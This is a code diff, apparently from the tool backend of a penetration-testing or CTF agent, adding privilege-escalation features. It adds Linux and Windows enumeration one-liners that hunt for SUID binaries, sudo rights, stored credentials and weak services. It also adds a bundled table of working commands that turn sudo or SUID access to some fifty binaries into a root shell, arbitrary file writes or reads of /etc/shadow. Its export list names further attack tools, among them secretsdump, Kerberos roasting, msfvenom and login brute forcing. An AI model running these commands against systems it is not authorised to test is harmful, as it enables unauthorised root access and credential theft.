@@ -885,6 +885,140 @@ def _b_flag_hunt(a):
     raise ValueError("`service` must be ssh or winrm (a shell is needed to sweep the FS)")
 
 
+# ── privilege-escalation enumeration (read-only, over an authenticated login) ──
+# Once you hold a shell, these sweep the classic local-privesc vectors in one login —
+# a LinPEAS/WinPEAS-lite as a native one-liner (no script uploaded, nothing written).
+# gtfobins_lookup is fully offline: a bundled map of SUID/sudo abuse techniques.
+
+# One read-only privesc sweep per platform. Single line each (the exec path forbids
+# control chars); everything is bounded with head/-First so the reply stays readable.
+_NIX_PRIVESC = (
+    "echo '=== whoami ==='; id; "
+    "echo '=== sudo ==='; sudo -n -l 2>/dev/null; "
+    "echo '=== suid ==='; find / -perm -4000 -type f 2>/dev/null | head -n 40; "
+    "echo '=== sgid ==='; find / -perm -2000 -type f 2>/dev/null | head -n 20; "
+    "echo '=== caps ==='; getcap -r / 2>/dev/null | head -n 20; "
+    "echo '=== cron ==='; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; "
+    "echo '=== writable-services ==='; "
+    "find /etc/systemd/ /lib/systemd/ -writable -type f 2>/dev/null | head -n 20; "
+    "echo '=== nfs ==='; cat /etc/exports 2>/dev/null; "
+    "echo '=== kernel ==='; uname -a; "
+    "echo '=== writable-dirs ==='; "
+    "find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run|dev|tmp)' | head -n 20"
+)
+_WIN_PRIVESC = (
+    "whoami; echo '=== priv ==='; whoami /priv; "
+    "echo '=== groups ==='; whoami /groups; "
+    "echo '=== unquoted-services ==='; Get-CimInstance Win32_Service | Where-Object { "
+    "$_.PathName -and $_.PathName -like '* *' -and $_.PathName -notlike '\"*' -and "
+    "$_.PathName -notlike 'C:\\Windows*' } | Select-Object Name,PathName -First 20 | Format-List; "
+    "echo '=== alwaysinstallelevated ==='; "
+    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null; "
+    "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null; "
+    "echo '=== stored-creds ==='; cmdkey /list; "
+    "echo '=== hotfixes ==='; Get-HotFix | Select-Object -Last 10 | Format-Table -AutoSize"
+)
+
+# Offline GTFOBins-style map: binary -> {function: exploitation command}. Curated to the
+# common local-privesc functions (sudo / suid); see gtfobins.github.io for the full set.
+_GTFOBINS = {
+    "find": {"sudo": "sudo find . -exec /bin/sh \\; -quit",
+             "suid": "./find . -exec /bin/sh -p \\; -quit"},
+    "vim":  {"sudo": "sudo vim -c ':!/bin/sh'",
+             "suid": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
+    "vi":   {"sudo": "sudo vi -c ':!/bin/sh'"},
+    "nano": {"sudo": "sudo nano  # then ^R^X and enter: reset; sh 1>&0 2>&0"},
+    "less": {"sudo": "sudo less /etc/profile  # then type: !/bin/sh"},
+    "more": {"sudo": "sudo more /etc/profile  # (small window) then: !/bin/sh"},
+    "man":  {"sudo": "sudo man man  # then type: !/bin/sh"},
+    "awk":  {"sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+             "suid": "./awk 'BEGIN {system(\"/bin/sh -p\")}'"},
+    "gawk": {"sudo": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"},
+    "python": {"sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+               "suid": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
+    "python3": {"sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+                "suid": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
+    "perl": {"sudo": "sudo perl -e 'exec \"/bin/sh\";'",
+             "suid": "./perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"},
+    "ruby": {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
+    "lua":  {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
+    "php":  {"sudo": "sudo php -r \"system('/bin/sh');\""},
+    "node": {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
+    "bash": {"sudo": "sudo bash", "suid": "./bash -p"},
+    "sh":   {"sudo": "sudo sh",   "suid": "./sh -p"},
+    "dash": {"suid": "./dash -p"},
+    "env":  {"sudo": "sudo env /bin/sh", "suid": "./env /bin/sh -p"},
+    "tar":  {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
+                     "--checkpoint-action=exec=/bin/sh"},
+    "zip":  {"sudo": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"},
+    "gdb":  {"sudo": "sudo gdb -nx -ex '!sh' -ex quit",
+             "suid": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"},
+    "make": {"sudo": "sudo make -s --eval=$'x:\\n\\t-'\"/bin/sh\""},
+    "nmap": {"sudo": "sudo nmap --interactive  # then: !sh   (old nmap only)"},
+    "ftp":  {"sudo": "sudo ftp  # then: !/bin/sh"},
+    "sed":  {"sudo": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"},
+    "ed":   {"sudo": "sudo ed  # then: !/bin/sh"},
+    "emacs":{"sudo": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"},
+    "socat":{"sudo": "sudo socat stdin exec:/bin/sh"},
+    "expect":{"sudo": "sudo expect -c 'spawn /bin/sh;interact'"},
+    "xargs":{"sudo": "sudo xargs -a /dev/null sh"},
+    "flock":{"sudo": "sudo flock -u / /bin/sh"},
+    "strace":{"sudo": "sudo strace -o /dev/null /bin/sh"},
+    "gcc":  {"sudo": "sudo gcc -wrapper /bin/sh,-s ."},
+    "rsync":{"sudo": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
+    "git":  {"sudo": "sudo git -p help config  # then: !/bin/sh"},
+    "docker":{"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
+    "mysql":{"sudo": "sudo mysql -e '\\! /bin/sh'"},
+    "journalctl":{"sudo": "sudo journalctl  # (pager) then: !/bin/sh"},
+    "cpulimit":{"sudo": "sudo cpulimit -l 100 -f -- /bin/sh -p"},
+    "openssl":{"sudo": "# load a malicious engine — see gtfobins.github.io/gtfobins/openssl"},
+    "systemctl":{"sudo": "# write a unit with ExecStart=/bin/sh then start it — see GTFOBins"},
+    "wget": {"sudo": "sudo wget --use-askpass=/bin/sh 0  # or overwrite a file with -O"},
+    "cp":   {"sudo": "# arbitrary write: sudo cp your_file /root/... (overwrite as root)"},
+    "tee":  {"sudo": "echo data | sudo tee /path/as/root  # arbitrary write"},
+    "dd":   {"sudo": "echo data | sudo dd of=/path/as/root  # arbitrary write"},
+    "cat":  {"suid": "./cat /etc/shadow  # arbitrary file READ as owner"},
+    "chmod":{"sudo": "sudo chmod 4755 /bin/bash  # then: bash -p"},
+    "chown":{"sudo": "sudo chown $(id -un):$(id -gn) /etc/passwd  # then edit it"},
+}
+
+
+def _b_linux_privesc_enum(a):
+    """Sweep the classic Linux local-privesc vectors over an authenticated ssh login —
+    sudo -l, SUID/SGID, capabilities, cron, writable service files, kernel, NFS exports,
+    writable dirs. Read-only, one login."""
+    host = _req_host(a)
+    return _ssh_run_argv(host, a, _NIX_PRIVESC)
+
+
+def _b_windows_privesc_enum(a):
+    """Sweep the classic Windows local-privesc vectors over an authenticated WinRM login
+    — token privileges (SeImpersonate…), groups, unquoted service paths,
+    AlwaysInstallElevated, stored creds (cmdkey), hotfix level. Read-only, one login."""
+    host = _req_host(a)
+    return _winrm_run_argv(host, a, _WIN_PRIVESC)
+
+
+def _b_gtfobins_lookup(a):
+    """Offline GTFOBins lookup: given a binary (found SUID or sudo-allowed), return the
+    known local-privesc technique(s). No target contact — a bundled reference."""
+    name = os.path.basename(_word(a, "binary").strip()).lower()
+    entry = _GTFOBINS.get(name)
+    if not entry:
+        return (f"'{name}' is not in the bundled GTFOBins set. Check the full list at "
+                f"https://gtfobins.github.io/gtfobins/{name}/ (functions like sudo/suid/"
+                f"capabilities may still exist there).", False)
+    out = [f"GTFOBins — {name}: local privilege-escalation technique(s)"]
+    for func in ("sudo", "suid", "capabilities", "shell"):
+        if func in entry:
+            out.append(f"\n[{func}]\n{entry[func]}")
+    for func, cmd in entry.items():                    # any other functions
+        if func not in ("sudo", "suid", "capabilities", "shell"):
+            out.append(f"\n[{func}]\n{cmd}")
+    out.append("\n\nFull reference: https://gtfobins.github.io/gtfobins/" + name + "/")
+    return "\n".join(out)
+
+
 # ── recon batch ───────────────────────────────────────────────────────────────
 def _b_subdomain_enum(a):
     domain = _word(a, "domain")
@@ -1912,5 +2046,5 @@ def _b_gpp_decrypt(a):
         pw = dec.decode("utf-8", "replace")
     return f"decrypted GPP password: {pw}"
 
-__all__ = ['MAX_OUTPUT', '_HOST_RE', '_PORTS_RE', '_ANSI_RE', '_req_host', '_port', '_ports', '_word', '_is_root', '_URL_RE', '_req_url', '_no_ctrl', '_WORDLISTS', '_resolve_wordlist', '_DNS_WORDLISTS', '_resolve_dns_wordlist', '_creds', '_hashes_arg', '_impacket_target', '_nxc_auth', '_run', '_NSE_DENY', '_nmap_tuning', '_RANGE_PORTS', '_b_port_discovery', '_b_service_discovery', '_b_script_scan', '_b_http_headers', '_b_ftp_anon', '_b_smb_enum', '_b_snmp_walk', '_b_dns', '_b_ssl_cert', '_b_banner', '_b_searchsploit', '_b_whois', '_b_http_request', '_b_web_content', '_b_whatweb', '_b_nikto', '_b_nuclei', '_b_smb_client', '_NXC_ACTIONS', '_b_nxc_smb', '_b_ldap_search', '_b_rpc_enum', '_b_secretsdump', '_IMPACKET_EXEC', '_b_impacket_exec', '_b_kerberos_roast', '_db_ident', '_b_mysql_query', '_b_mssql_query', '_b_psql_query', '_REDIS_DENY', '_b_redis_cli', '_b_mongo_query', '_b_ssh_exec', '_b_winrm_exec', '_b_ftp_transfer', '_b_subdomain_enum', '_b_dns_zone_transfer', '_b_traceroute', '_b_vhost_fuzz', '_ROOT', '_b_hash_identify', '_b_jwt_decode', '_b_data_transform', '_b_cidr_expand', '_b_ip_info', '_SHELL_TEMPLATES', '_b_payload_gen', '_DEFAULT_CREDS', '_b_default_creds', '_ver_key', '_b_cve_lookup', '_b_tls_analyze', '_b_robots_sitemap', '_b_sqlmap', '_b_wpscan', '_b_enum4linux', '_b_smbmap', '_b_certipy', '_b_testssl', '_b_ssh_audit', '_b_smtp_user_enum', '_b_wafw00f', '_http_get', '_b_git_dump', '_b_s3_check', '_SEC_HEADERS', '_b_security_headers', '_b_cookie_analyze', '_mmh3_32', '_b_favicon_hash', '_b_js_endpoints', '_b_cors_check', '_SUBDOMAINS', '_b_dns_bruteforce', '_b_bloodhound', '_b_katana', '_b_gau', '_b_arjun', '_b_dalfox', '_b_commix', '_b_dnsrecon', '_b_nbtscan', '_b_theharvester', '_MSF_FORMATS', '_b_msfvenom', '_USER_WORDLISTS', '_PASS_WORDLISTS', '_resolve_preset', '_HYDRA_SERVICES', '_b_login_bruteforce', '_KERBRUTE_MODES', '_b_kerbrute', '_b_nfs_enum', '_b_rsync_enum', '_b_memcached_stats', '_GPP_KEY', '_b_gpp_decrypt', '_b_read_file', '_b_flag_hunt']
+__all__ = ['MAX_OUTPUT', '_HOST_RE', '_PORTS_RE', '_ANSI_RE', '_req_host', '_port', '_ports', '_word', '_is_root', '_URL_RE', '_req_url', '_no_ctrl', '_WORDLISTS', '_resolve_wordlist', '_DNS_WORDLISTS', '_resolve_dns_wordlist', '_creds', '_hashes_arg', '_impacket_target', '_nxc_auth', '_run', '_NSE_DENY', '_nmap_tuning', '_RANGE_PORTS', '_b_port_discovery', '_b_service_discovery', '_b_script_scan', '_b_http_headers', '_b_ftp_anon', '_b_smb_enum', '_b_snmp_walk', '_b_dns', '_b_ssl_cert', '_b_banner', '_b_searchsploit', '_b_whois', '_b_http_request', '_b_web_content', '_b_whatweb', '_b_nikto', '_b_nuclei', '_b_smb_client', '_NXC_ACTIONS', '_b_nxc_smb', '_b_ldap_search', '_b_rpc_enum', '_b_secretsdump', '_IMPACKET_EXEC', '_b_impacket_exec', '_b_kerberos_roast', '_db_ident', '_b_mysql_query', '_b_mssql_query', '_b_psql_query', '_REDIS_DENY', '_b_redis_cli', '_b_mongo_query', '_b_ssh_exec', '_b_winrm_exec', '_b_ftp_transfer', '_b_subdomain_enum', '_b_dns_zone_transfer', '_b_traceroute', '_b_vhost_fuzz', '_ROOT', '_b_hash_identify', '_b_jwt_decode', '_b_data_transform', '_b_cidr_expand', '_b_ip_info', '_SHELL_TEMPLATES', '_b_payload_gen', '_DEFAULT_CREDS', '_b_default_creds', '_ver_key', '_b_cve_lookup', '_b_tls_analyze', '_b_robots_sitemap', '_b_sqlmap', '_b_wpscan', '_b_enum4linux', '_b_smbmap', '_b_certipy', '_b_testssl', '_b_ssh_audit', '_b_smtp_user_enum', '_b_wafw00f', '_http_get', '_b_git_dump', '_b_s3_check', '_SEC_HEADERS', '_b_security_headers', '_b_cookie_analyze', '_mmh3_32', '_b_favicon_hash', '_b_js_endpoints', '_b_cors_check', '_SUBDOMAINS', '_b_dns_bruteforce', '_b_bloodhound', '_b_katana', '_b_gau', '_b_arjun', '_b_dalfox', '_b_commix', '_b_dnsrecon', '_b_nbtscan', '_b_theharvester', '_MSF_FORMATS', '_b_msfvenom', '_USER_WORDLISTS', '_PASS_WORDLISTS', '_resolve_preset', '_HYDRA_SERVICES', '_b_login_bruteforce', '_KERBRUTE_MODES', '_b_kerbrute', '_b_nfs_enum', '_b_rsync_enum', '_b_memcached_stats', '_GPP_KEY', '_b_gpp_decrypt', '_b_read_file', '_b_flag_hunt', '_b_linux_privesc_enum', '_b_windows_privesc_enum', '_b_gtfobins_lookup']
 
